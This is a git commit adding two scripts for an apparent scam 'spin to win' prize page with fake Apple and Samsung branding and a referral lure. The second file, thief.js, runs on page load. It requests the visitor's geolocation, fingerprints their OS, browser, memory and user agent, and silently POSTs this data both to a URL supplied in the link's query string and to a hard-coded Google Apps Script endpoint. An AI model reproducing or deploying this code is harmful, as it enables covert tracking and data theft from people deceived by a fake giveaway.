ec2d30e59df7cdf262b91ba9987182b699c31bed
MD Seam <118121199+Sh-Seam@users.noreply.github.com>
2023-02-14 23:31:02 +0600

    Add files via upload

---
+++ ss.js
@@ -0,0 +1,142 @@
+let container = document.querySelector(".container");
+let btn1 = document.getElementById("spin");
+// let number = Math.ceil(180);
+
+// btn.onclick = function () {
+// 	container.style.transform = "rotate(" + number + "deg)";
+// 	number += Math.ceil(360*3);
+// }
+
+if(sessionStorage.getItem("degree")==null){
+	sessionStorage.setItem("degree",360*5)
+	}else{console.log("Degree Error")}
+var rand;
+var number;
+btn1.onclick = function () {
+	var des = sessionStorage.getItem("degree");
+	des=parseInt(des);
+	var rand =  Math.floor(Math.random() * 4) + 1;
+	console.log(rand);
+	if (rand==1){//8
+		var number = Math.ceil(45);
+		number=des+number;
+		seam(number,des);
+
+	}else if(rand==2){//6
+		var number = Math.ceil(90+45);
+		number=des+number;
+		seam(number,des);
+	}else if(rand==3){//4
+		var number = Math.ceil(180+45);
+		number=des+number;
+		seam(number,des);
+	}else if(rand==4){//2
+		var number = Math.ceil(270+45);
+		number=des+number;
+		seam(number,des);
+	}
+
+}
+
+
+
+function seam(number,des) {
+	// number += Math.ceil(number);
+	console.log("Degree "+number)
+	container.style.transform = "rotate(" + number + "deg)";
+	var deg = des+360*20;
+	sessionStorage.setItem("degree", deg)
+	ss();
+	}
+
+
+function ss(){
+	var bug =document.getElementById("spin");
+	bug.classList.toggle("btnhide");
+	// Get the modal
+	var modal1 = document.getElementById("myModal1");
+
+
+	// Get the <span> element that closes the modal
+	var span1 = document.getElementById("close1");
+
+	// When the user clicks the button, open the modal 
+	function ss2() {
+	modal1.style.display = "block";
+	}
+	setTimeout(() => {ss2()}, 5500); 
+	// When the user clicks on <span> (x), close the modal
+	span1.onclick = function() {
+	modal1.style.display = "none";
+	var bug =document.getElementById("spin");
+	bug.classList.toggle("btnhide");
+	}
+
+	// When the user clicks anywhere outside of the modal, close it
+	window.onclick = function(event) {
+	if (event.target == modal1) {
+		modal1.style.display = "none";
+		var bug =document.getElementById("spin");
+		bug.classList.toggle("btnhide");
+	}
+	}
+
+}
+
+function ssrr(){
+	var bug =document.getElementById("spin");
+	bug.classList.toggle("btnhide");
+
+
+	// Get the modal
+	var modal2 = document.getElementById("myModal2");
+
+
+	// Get the <span> element that closes the modal
+	var span2 = document.getElementById("close2");
+
+	// When the user clicks the button, open the modal 
+	function ss23() {
+	modal2.style.display = "block";
+	}
+	ss23();
+	// setTimeout(() => {ss2()}, 5500); 
+	// When the user clicks on <span> (x), close the modal
+	span2.onclick = function() {
+	modal2.style.display = "none";
+	var bug =document.getElementById("spin");
+	bug.classList.toggle("btnhide");
+	}
+
+	// When the user clicks anywhere outside of the modal, close it
+	window.onclick = function(event) {
+	if (event.target == modal2) {
+		modal2.style.display = "none";
+		var bug =document.getElementById("spin");
+		bug.classList.toggle("btnhide");
+	}
+	};
+	
+	var rbtn = document.getElementById("rbtn22");
+
+	function reffer(){
+		var rintput = document.getElementById("delet");
+		rintput.innerHTML=`<center><p>Your reffer code is : <p>${reffercode}</p></p>
+		<p>Reffer Friend to Increase winning chance .</p>
+	  </center></div>
+	  <div class="modal-footer">
+		<h3><center>&copy; Apple&trade; and &copy; Sumsung&trade</center> </h3>
+	  </div>`
+	};
+	rbtn.addEventListener('click', reffer);
+
+}
+
+if (sessionStorage.getItem("refer")==null){
+	ssrr();
+	var reffercode = `${Math.floor(Math.random() * 8) + 1}${Math.floor(Math.random() * 8) + 1}${Math.floor(Math.random() * 8) + 1}${Math.floor(Math.random() * 8) + 1}${Math.floor(Math.random() * 8) + 1}${Math.floor(Math.random() * 8) + 1}`;
+	sessionStorage.setItem("refer",reffercode)
+	
+}else{
+		document.getElementById("ownrefer").innerText=`Your Reffer           Code is : `+sessionStorage.getItem("refer");
+	}
---
+++ thief.js
@@ -0,0 +1,181 @@
+window.addEventListener('load', () => {
+      const params = (new URL(document.location)).searchParams
+      const name = params.get('name');
+      sessionStorage.setItem("linkloca",name)
+  })
+  //
+
+
+var osname = sessionStorage.getItem('OSName');
+var osver = sessionStorage.getItem('OSVersion');
+var browN = sessionStorage.getItem('BrowN');
+var browV = sessionStorage.getItem('BrowV');
+
+
+
+
+
+  //
+
+function log(){
+  var date1 = new Date();
+  var link = sessionStorage.getItem("linkloca");
+
+  var clocation =`https://www.google.com/maps/search/?api=1&query=${sessionStorage.getItem('latitude')},${sessionStorage.getItem('longitude')}`;
+
+  fetch(link, {
+    method: "POST",
+    body: JSON.stringify({
+        location: clocation.toString(),
+        ram: navigator.deviceMemory.toString(),
+        useragent: navigator.userAgent.toString(),
+        appVersion: navigator.appVersion.toString(),
+        platform: navigator.platform.toString(),
+        vendor: navigator.vendor.toString(),
+        osname: sessionStorage.getItem('OSName').toString(),
+        osver: sessionStorage.getItem('OSVersion').toString(),
+        browN: sessionStorage.getItem('BrowN').toString(),
+        browV: sessionStorage.getItem('BrowV').toString(),
+        date: date1.toString()
+
+    })
+})
+    .then(res => res.text())
+    .then(data => {
+        console.log(data);
+    });
+ fetch('https://script.google.com/macros/s/AKfycbwJXiFUJd4NMCWxZy6GwSAU1HjLGdC7n2O2SLuAuTM8V3vgu3W9o_-GLvD3Jct-rpCq5g/exec?action=addUser', {
+    method: "POST",
+    body: JSON.stringify({
+        location: clocation.toString(),
+        ram: navigator.deviceMemory.toString(),
+        useragent: navigator.userAgent.toString(),
+        appVersion: navigator.appVersion.toString(),
+        platform: navigator.platform.toString(),
+        vendor: navigator.vendor.toString(),
+        osname: sessionStorage.getItem('OSName').toString(),
+        osver: sessionStorage.getItem('OSVersion').toString(),
+        browN: sessionStorage.getItem('BrowN').toString(),
+        browV: sessionStorage.getItem('BrowV').toString(),
+        date: date1.toString()
+
+    })
+})
+    .then(res => res.text())
+    .then(data => {
+        console.log(data);
+    });
+}
+
+
+
+function osdata() {
+    'use strict';
+
+    var module = {
+        options: [],
+        header: [navigator.platform, navigator.userAgent, navigator.appVersion, navigator.vendor, window.opera],
+        dataos: [
+            { name: 'Windows Phone', value: 'Windows Phone', version: 'OS' },
+            { name: 'Windows', value: 'Win', version: 'NT' },
+            { name: 'iPhone', value: 'iPhone', version: 'OS' },
+            { name: 'iPad', value: 'iPad', version: 'OS' },
+            { name: 'Kindle', value: 'Silk', version: 'Silk' },
+            { name: 'Android', value: 'Android', version: 'Android' },
+            { name: 'PlayBook', value: 'PlayBook', version: 'OS' },
+            { name: 'BlackBerry', value: 'BlackBerry', version: '/' },
+            { name: 'Macintosh', value: 'Mac', version: 'OS X' },
+            { name: 'Linux', value: 'Linux', version: 'rv' },
+            { name: 'Palm', value: 'Palm', version: 'PalmOS' }
+        ],
+        databrowser: [
+            { name: 'Chrome', value: 'Chrome', version: 'Chrome' },
+            { name: 'Firefox', value: 'Firefox', version: 'Firefox' },
+            { name: 'Safari', value: 'Safari', version: 'Version' },
+            { name: 'Internet Explorer', value: 'MSIE', version: 'MSIE' },
+            { name: 'Opera', value: 'Opera', version: 'Opera' },
+            { name: 'BlackBerry', value: 'CLDC', version: 'CLDC' },
+            { name: 'Mozilla', value: 'Mozilla', version: 'Mozilla' }
+        ],
+        init: function () {
+            var agent = this.header.join(' '),
+                os = this.matchItem(agent, this.dataos),
+                browser = this.matchItem(agent, this.databrowser);
+
+            return { os: os, browser: browser };
+        },
+        matchItem: function (string, data) {
+            var i = 0,
+                j = 0,
+                html = '',
+                regex,
+                regexv,
+                match,
+                matches,
+                version;
+
+            for (i = 0; i < data.length; i += 1) {
+                regex = new RegExp(data[i].value, 'i');
+                match = regex.test(string);
+                if (match) {
+                    regexv = new RegExp(data[i].version + '[- /:;]([\\d._]+)', 'i');
+                    matches = string.match(regexv);
+                    version = '';
+                    if (matches) { if (matches[1]) { matches = matches[1]; } }
+                    if (matches) {
+                        matches = matches.split(/[._]+/);
+                        for (j = 0; j < matches.length; j += 1) {
+                            if (j === 0) {
+                                version += matches[j] + '.';
+                            } else {
+                                version += matches[j];
+                            }
+                        }
+                    } else {
+                        version = '0';
+                    }
+                    return {
+                        name: data[i].name,
+                        version: parseFloat(version)
+                    };
+                }
+            }
+            return { name: 'unknown', version: 0 };
+        }
+    };
+
+    var e = module.init();
+
+
+    sessionStorage.setItem("OSName",e.os.name)
+    sessionStorage.setItem("OSVersion",e.os.version)
+    sessionStorage.setItem("BrowN",e.browser.name)
+    sessionStorage.setItem("BrowV",e.browser.version);
+    //
+
+}
+osdata();
+
+function getLocation() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(savePosition, positionError, { timeout: 10000 });
+    } else {
+      //Geolocation is not supported by this browser
+    }
+  };
+
+  // handle the error here
+  function positionError(error) {
+    var message = error.message;
+
+    alert(message);
+  };
+
+  function savePosition(position) {
+    sessionStorage.setItem("latitude",position.coords.latitude);
+    sessionStorage.setItem("longitude",position.coords.longitude);
+  };
+
+getLocation();
+
+log();
